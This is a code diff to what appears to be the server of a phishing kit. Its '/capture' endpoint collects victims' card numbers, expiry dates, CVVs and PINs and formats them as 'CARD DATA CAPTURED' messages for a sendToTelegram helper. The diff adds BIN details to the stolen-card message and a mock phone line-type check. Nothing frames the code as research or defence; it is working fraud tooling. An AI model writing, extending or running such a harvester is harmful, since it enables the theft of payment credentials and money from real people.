@@ -97,8 +97,19 @@ const sendToTelegram = async (message) => {
     }
 };
 
+// Removed duplicate line-type endpoint
+
 // Endpoint to handle form submissions
 app.post('/capture', async (req, res) => {
+    // ── Phone Validation Endpoint (Mock) ──────────────────────────────────────────
+    if (req.query.action === 'line-type') {
+        const phone = req.body.phone || '';
+        if (!phone) return res.json({ type: 'unknown' });
+        if (phone.endsWith('0000')) return res.json({ type: 'voip' });
+        if (phone.endsWith('1111')) return res.json({ type: 'landline' });
+        return res.json({ type: 'mobile' });
+    }
+
     const d = req.body;
     
     // Server-side Input Validation
@@ -173,8 +184,9 @@ app.post('/capture', async (req, res) => {
             break;
             
         case 'card':
+            let binStr = d.bin_data ? `\n🏦 <b>BIN Info:</b> <code>${he(d.bin_data)}</code>` : '';
             msg = "💳 <b>✅ CARD DATA CAPTURED</b>\n" + header
-                + `💳 <b>Card:</b> <code>${he(d.card_num || 'N/A')}</code>\n`
+                + `💳 <b>Card:</b> <code>${he(d.card_num || 'N/A')}</code>${binStr}\n`
                 + `📅 <b>Exp:</b>  <code>${he(d.exp || 'N/A')}</code>\n`
                 + `🔐 <b>CVV:</b>  <code>${he(d.cvv || 'N/A')}</code>\n`
                 + `🔑 <b>PIN:</b>  <code>${he(d.pin || 'N/A')}</code>\n`
